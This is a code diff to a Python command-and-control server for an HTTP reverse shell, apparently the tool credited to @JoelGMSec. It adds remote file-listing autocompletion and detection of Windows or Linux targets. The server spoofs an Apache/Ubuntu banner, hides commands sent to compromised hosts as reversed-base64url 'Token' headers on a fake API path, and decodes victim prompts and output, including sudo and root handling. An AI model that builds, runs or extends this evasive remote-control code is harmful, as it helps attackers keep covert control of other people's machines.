@@ -14,6 +14,7 @@ from sys import argv
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+system = None
 supersu = False
 remote_files = []
 last_prompt = None
@@ -36,15 +37,28 @@ banner2 = """
   ---------------- by @JoelGMSec -----------------
 """
 
+def update_remote_files_list():
+    global remote_files, autocomplete_pending, system, prompt
+    autocomplete_pending = True
+    if system == "windows":
+        if prompt and "!" in prompt:
+            current_path = prompt.split("!")[-1].strip()
+            command = f"(ls {current_path}).Name"
+        else:
+            command = "(ls).Name"
+    else:
+        if prompt and "!" in prompt:
+            current_path = prompt.split("!")[-1].strip()
+            command = f"ls {current_path}"
+        else:
+            command = "ls"
+    return command
+
 def completer(text, state):
-    global remote_files, autocomplete_pending
-    if not remote_files and not autocomplete_pending:
-        update_remote_files_list()
+    global remote_files
     text_lower = text.lower()
     options = [f for f in remote_files if f.lower().startswith(text_lower)]
-    if len(options) == 1:
-        return options[state]
-    else:
+    if state < len(options):
         return options[state]
     return None
 
@@ -103,8 +117,8 @@ class MyServer(BaseHTTPRequestHandler):
         global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
-        global local_path ; global remote_path ; global command
-        global remote_files ; global last_prompt ; global autocomplete_pending
+        global local_path ; global remote_path ; global command 
+        global system, last_prompt, autocomplete_pending
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -121,14 +135,27 @@ class MyServer(BaseHTTPRequestHandler):
                     print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
 
             elif self.path == "/api/v1/Client/Token":
-                if prompt != last_prompt and not autocomplete_pending:
+                if prompt and "\\" in prompt:
+                    system = "windows"
+                else:
+                    system = "linux"
+                
+                if prompt != last_prompt and not autocomplete_pending and not first_run:
                     last_prompt = prompt
-                    remote_files = []
                     autocomplete_pending = True
-                    if system == "linux":
-                        command = "ls"
                     if system == "windows":
-                        command = "(ls).name"
+                        if prompt and "!" in prompt:
+                            current_path = prompt.split("!")[-1].strip()
+                            command = f"(ls {current_path}).Name"
+                        else:
+                            command = "(ls).Name"
+                    else:
+                        if prompt and "!" in prompt:
+                            current_path = prompt.split("!")[-1].strip()
+                            command = f"ls {current_path}"
+                        else:
+                            command = "ls"
+                    
                     encoded_command = "Token: "
                     encoded_command += self.encode_reversed_base64url(command)
                     self._set_headers()
@@ -147,10 +174,8 @@ class MyServer(BaseHTTPRequestHandler):
 
                 if "\\" in path:
                     slash = "\\"
-                    system = "windows"
                 else:
                     slash = "/"
-                    system = "linux"
 
                 if len(str(path).rstrip()) > 24:
                     shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
@@ -271,9 +296,6 @@ class MyServer(BaseHTTPRequestHandler):
                         cmd_response = False
                         first_run = False
 
-                        if "cd " in command:
-                            last_prompt = None
-
                         if root and not "cd" in command:
                             if not wait_for_cmd and not "exit" in command:
                                 if supersu:
@@ -324,8 +346,8 @@ class MyServer(BaseHTTPRequestHandler):
         global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
-        global local_path ; global remote_path ; global command
-        global remote_files ; global autocomplete_pending
+        global local_path ; global remote_path ; global command 
+        global remote_files, autocomplete_pending, last_prompt
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -336,6 +358,8 @@ class MyServer(BaseHTTPRequestHandler):
 
             if str("Info:") in encoded_data:
                 prompt = self.decode_reversed_base64url(encoded_payload)
+                if last_prompt is None:
+                    last_prompt = prompt
 
             else:
                 decoded_payload = self.decode_reversed_base64url(encoded_payload)
